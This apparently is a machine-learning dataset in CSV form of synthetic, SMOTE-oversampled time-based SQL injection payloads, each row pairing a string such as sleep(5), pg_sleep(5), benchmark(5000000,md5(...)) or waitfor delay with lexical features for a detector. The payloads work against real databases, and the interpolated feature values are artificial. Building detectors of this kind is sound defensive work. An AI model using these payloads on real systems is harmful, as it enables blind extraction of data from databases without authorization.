id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000031,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,0.6770536471415155,58.84812453772324,21.28270817924108,3.3410325912846974,15.42406226886162,10.0,25.42406226886162,8.0,0.26181943521770623,0.17012897484449557,0.43194841006220175,0.13610317987559648,0.1413540896205403,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.8586459103794599,3.0,0.1413540896205402,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.14135408962054016,0.0,0.8586459103794598,0.1413540896205402,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.14135408962054
SMOTE_000032,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000031,2.187335649156763,90.8103811820571,26.325769411470677,3.389056635610949,24.348461177058642,11.628847057353395,41.8103811820571,13.022691765587963,0.2698309813142031,0.13215627184016762,0.45475927543230216,0.14325347141332712,0.0,3.6742305885293214,0.0,0.0,0.0,1.0,0.0,7.022691765587963,0.32576941147067895,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.32576941147067895,0.0,0.32576941147067895,0.0,0.0,0.0,1.0,0.6742305885293209,0.0,0.0,0.0,0.0,0.0,0.0,0.6742305885293209,0.32576941147067895,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000033,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000032,0.0886642054485218,84.29900902805923,20.079735740815796,2.942105073185295,30.0,2.0,42.21927328724344,10.079735740815796,0.35606418099545734,0.023737612066363822,0.5007047350829679,0.11949347185521098,0.019933935203948705,0.0,0.0,0.0,1.0,0.0,0.0,9.039867870407898,0.0,0.0,0.0,1.0,0.019933935203948983,0.0,0.0,0.01993393520394901,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000034,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000076,1.8020485269839184,91.18364511215559,23.246361761680948,2.986161522320997,28.83090784112063,2.0,47.18364511215558,13.16909215887937,0.31889901843849766,0.022063434328119344,0.5146044447813745,0.14443310245200852,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.753638238319054,0.41545392056031555,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.5845460794396844,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.584546079439685
SMOTE_000035,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.45553441096452524,91.32392402832534,23.152370542879513,2.9555091420107735,30.0,2.0,47.47629457120485,11.847629457120485,0.3291741777013165,0.02194494518008777,0.5190693833902582,0.12981149372833742,0.1523705428795148,0.0,0.0,0.0,1.0,0.0,0.0,9.69525891424097,0.0,0.0,0.0,1.0,0.15237054287951463,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000036,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000020,0.26594035205381766,68.63485880851273,25.726144106384545,3.6493005495978923,22.634858808512725,10.0,27.908714702128183,8.091285297871819,0.32958829547192536,0.14574167489740752,0.4066723005147131,0.11799772911595399,0.0,0.0912852978718186,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.0912852978718186,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000037,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000040,1.9111335221843933,67.74309933491622,21.24901419070232,3.4165655105909614,24.665352254269756,3.416338063567439,27.41239482637671,12.249014190702317,0.36804332591077177,0.05049462875968862,0.3997845570737434,0.18167748825579624,5.416338063567439,0.0,0.0,0.0,0.0,0.583661936432561,0.0,4.249014190702317,0.0,0.0,0.0,0.583661936432561,1.0,0.0,0.0,0.0,0.0,0.583661936432561,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000073,0.7379097193579017,74.8266349037007,26.0,3.60237169817953,16.330181131153267,21.332545282788317,29.163908489759113,8.0,0.21666253400242275,0.2861398138862429,0.3896154235266911,0.10758222858464331,0.8337273586058412,0.0,0.0,0.0,0.0,1.0,0.0,5.166272641394158,0.0,0.0,1.0,1.0,0.8337273586058414,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.16627264139415876,0.0,0.0,0.0,0.16627264139415876,0.8337273586058411,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.166272641394159
SMOTE_000039,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000045,1.3328212683293017,78.77825409275279,24.324914563433445,3.5879809882628746,29.324914563433445,7.846318724414427,31.085616643923935,10.521404160980984,0.3747740500531418,0.09355025935148523,0.39672881947611016,0.13494687111926282,3.760702080490492,0.0,0.0,0.0,0.0,1.7607020804904918,0.0,4.0,0.0,1.0,0.0,1.7607020804904918,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.7607020804904918,1.7607020804904923,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.521404160980984
SMOTE_000040,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,0.5715421164989051,56.205243559763204,22.0960673301776,3.690566877606655,23.0,3.698689110059199,18.506554449704,11.0,0.40963925982294186,0.06613464616770515,0.3283116653983808,0.19591442861097222,5.698689110059199,0.0,0.0,0.0,0.0,1.0,0.0,2.3013108899408006,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000041,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000054,2.1381023836280355,89.4055754683,21.437377357872727,3.1390240731436743,30.046721697340907,6.874754715745452,42.26541037627727,10.218688678936363,0.3377551438444964,0.07245840594254223,0.47512880247068645,0.11465764774227492,0.0,0.0,0.0,0.0,1.0,0.6093443394681816,0.0,8.0,0.0,0.0,0.0,1.6093443394681817,0.0,0.0,0.0,0.6093443394681817,0.0,0.6093443394681816,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.6093443394681816,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.609344339468182
SMOTE_000042,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,0.7703267802074768,56.44071069642723,19.587614261902967,3.268549666257071,21.853096434524257,2.322132089281677,24.559289303572776,7.706192869048516,0.3874327375944187,0.04013277430488704,0.43562422324134226,0.13681026485935202,2.7061928690485164,0.0,0.0,0.0,0.0,1.0,0.0,3.853096434524258,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.146903565475742,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.853096434524258,0.0,0.14690356547574202,0.0,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8530964345242578
SMOTE_000043,attack,time,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000022,1.218650598216265,84.04656199564215,27.0,3.8522678994753,19.717611571117295,27.023280997821075,28.588057855586484,8.717611571117297,0.23559867603585363,0.32043894808578505,0.34004180457959854,0.10392057129876271,0.0,0.0,2.0,0.0,0.0,1.717611571117297,0.0,4.0,0.0,0.0,1.0,3.7176115711172972,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.7176115711172969,0.0,0.28238842888270305,0.7176115711172968,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.717611571117297
SMOTE_000044,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000029,0.8107475100459667,66.87405021950991,25.324430131705945,3.589569685902269,22.099240175607928,10.0,27.774810043901983,7.0,0.3299825342886581,0.14968709099087324,0.41554941102685744,0.10478096369361126,0.0,0.22518995609801795,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.22518995609801795,0.0,0.774810043901982,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000045,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,1.814197654418984,80.3742785243125,24.196325503473215,3.5797172191204316,18.993875839122023,22.190201342595238,30.39265100694643,8.79755033564881,0.23628977382070987,0.274429988755215,0.379598427989754,0.10968180943432113,0.3987751678244047,0.0,0.0,0.0,0.0,1.3987751678244047,0.0,5.0,0.0,0.0,1.0,1.3987751678244047,0.39877516782440475,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.3987751678244047,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3987751678244047
SMOTE_000046,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000072,0.7039892625777674,87.11624249481471,27.222588749629622,3.6919752671720594,25.33553249777773,18.0,34.335532497777734,9.445177499259245,0.2902569132577474,0.20747177297052177,0.39399279974300827,0.10827851402872256,0.0,0.2225887496296221,2.0,0.0,0.0,2.0,0.0,4.222588749629622,0.0,1.0,0.0,4.0,0.0,0.222588749629622,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000047,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,1.475678277667575,77.51394776361393,20.859763434529743,3.0361759376648045,27.75697388180696,1.5513947763613913,37.654184329084174,10.551394776361391,0.357495498882072,0.01967928118807695,0.4865513469180148,0.13627387301183622,0.5513947763613921,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,0.5513947763613921,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000048,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000059,1.3308012634915414,67.91685445638359,22.0,3.349552894166483,17.096110510065326,12.41037197315913,29.807778979869347,8.602592993289782,0.2552044830416551,0.17960536966687266,0.4387227942233965,0.12646735306807577,0.0,0.6987035033551088,2.0,0.0,0.0,1.3012964966448912,0.0,4.301296496644891,0.0,0.0,0.3012964966448913,3.301296496644891,0.0,0.6987035033551088,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000049,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000075,1.1160195893251943,91.36911517204436,26.652353931182255,3.7678657936591162,22.0,27.0,32.69529213763549,9.673823034408873,0.24094323878482699,0.29570306578137856,0.3575405978678632,0.10581309756593128,0.6738230344088733,0.3261769655911267,0.0,0.0,0.0,2.0,0.0,4.673823034408873,0.0,0.0,1.0,2.0,0.6738230344088731,0.3261769655911267,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000050,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,1.582617600051475,78.45274994949692,19.094500101006155,3.0625199650539683,14.273625025251539,18.0,36.905499898993845,9.273625025251539,0.18202825541704992,0.22946745042068967,0.47021699719540205,0.11828729696685833,0.0,0.0,0.5472500505030775,0.0,0.0,2.0,0.0,5.726374974748461,0.0,0.0,1.0,2.5472500505030773,0.0,0.0,0.27362502525153876,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2736250252515387,0.0,1.4527499494969227,0.27362502525153876,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000051,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000003,0.3619413744749725,70.46142904157736,24.0,3.4529706373251394,19.0,10.0,30.569143233261887,10.89228580831547,0.269789340207006,0.14199438958263474,0.4336544748768023,0.15456179533355688,0.10771419168452834,0.8922858083154716,2.0,0.0,0.0,1.0,0.0,4.892285808315472,1.0,1.0,0.0,3.0,0.10771419168452862,0.8922858083154714,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000052,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000003,2.3479037081568364,76.51880517548966,24.91980086258161,3.349474227671609,19.459900431290805,10.0,35.59900431290805,11.459900431290805,0.25535306843498107,0.13148005230699192,0.4629978526686394,0.15016902658938755,0.45990043129080505,0.540099568709195,2.0,0.0,0.0,1.0,0.0,5.91980086258161,0.5400995687091951,1.0,0.0,3.0,0.45990043129080516,0.540099568709195,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.45990043129080505,0.540099568709195,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000053,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000059,0.008238622235427635,63.965230693252735,22.009934087642076,3.3745287671751294,18.0,10.0,27.970197737073775,7.995032956178963,0.281421559079345,0.15634531059963613,0.43724402296097725,0.12498910736004158,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.995032956178963,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000054,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000037,0.11295997942601077,64.40893099085858,24.038945808653196,3.4671900149223753,20.214201947592585,10.0,27.11683742595959,7.0778916173063955,0.3135166001523445,0.15549828861974527,0.421219937225778,0.10976517400213222,0.07789161730639438,0.9805270956734011,0.0,0.0,0.0,1.0194729043265987,0.0,4.0,0.0,1.0,0.0,1.0194729043265989,0.019472904326598872,0.9805270956734011,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0194729043265987,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.019472904326599
SMOTE_000055,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000046,0.06178389788757178,89.69649984044658,28.0,3.6155309036323193,25.0,18.0,36.75719987235726,9.939299968089315,0.27876960836455367,0.20071411802247865,0.40972254828962484,0.11079372532334282,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.9392999680893155,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000056,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000045,1.3269598182812061,78.80561594067181,24.332281214796257,3.588425937290433,29.332281214796257,7.855790133309474,31.094035674052865,10.523508918513217,0.37472977250186557,0.09365623168984788,0.396691466849915,0.1349225289583716,3.761754459256608,0.0,0.0,0.0,0.0,1.7617544592566083,0.0,4.0,0.0,1.0,0.0,1.7617544592566083,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.7617544592566082,1.7617544592566086,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5235089185132167
SMOTE_000057,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.22397318345377693,93.26385944055552,22.93403513986112,2.9080779582225804,29.86807027972224,2.0,49.26385944055552,12.131929720277762,0.3203430609464031,0.021446877410363496,0.5281686969720034,0.13004136467122998,0.0,0.06596486013888136,0.0,0.0,1.0,0.0,0.0,10.06596486013888,0.0,0.0,0.0,1.0,0.0,0.06596486013888139,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.06596486013888136,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.065964860138881
SMOTE_000058,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,2.336971787238593,83.89877737216227,26.89877737216227,3.441668155692687,22.24694343040568,13.595109488649086,37.404890511350914,10.651833941756593,0.26485056800573015,0.16150337545517385,0.44645727004726754,0.12718878649182846,0.550611313918864,0.0,2.0,0.0,0.0,1.449388686081136,0.0,5.651833941756592,0.0,1.0,0.0,3.449388686081136,0.5506113139188641,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.44938868608113586,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.449388686081136
SMOTE_000059,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000037,2.18145917317365,63.23719010906976,20.94876043627904,3.2305027142835945,20.76280989093024,6.567355490813924,28.14421483639536,7.762809890930239,0.32864819325557965,0.10280716993986733,0.44552056869567025,0.1230240681088828,0.0,1.7628098909302392,0.0,0.0,0.0,1.0,0.0,4.381404945465119,0.0,0.6185950545348804,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.6185950545348804,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.38140494546511955,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000060,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000008,1.0854661662878429,59.866035421463934,22.422643052357376,3.5161289616570515,20.133964578536066,10.0,23.73207084292787,6.0,0.3369921176279074,0.16712401470348842,0.3956094588465111,0.10027440882209307,0.7113215261786885,0.0,0.0,0.0,0.0,1.0,0.0,3.2886784738213115,0.0,0.0,0.0,1.0,0.7113215261786883,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.2886784738213115,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2886784738213115
SMOTE_000061,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000027,0.4681490165494858,89.0,27.802721283665008,3.857135129635883,25.704081925497512,22.098639358167496,30.49319679083748,10.704081925497512,0.28880990927525296,0.24829931863109544,0.3426201886610953,0.12027058343255631,3.605442567330016,0.0,0.0,0.0,0.0,1.901360641832504,0.0,4.197278716334992,0.0,0.0,1.0,1.901360641832504,0.901360641832504,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.09863935816749603,0.0,0.0,0.0,1.901360641832504,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
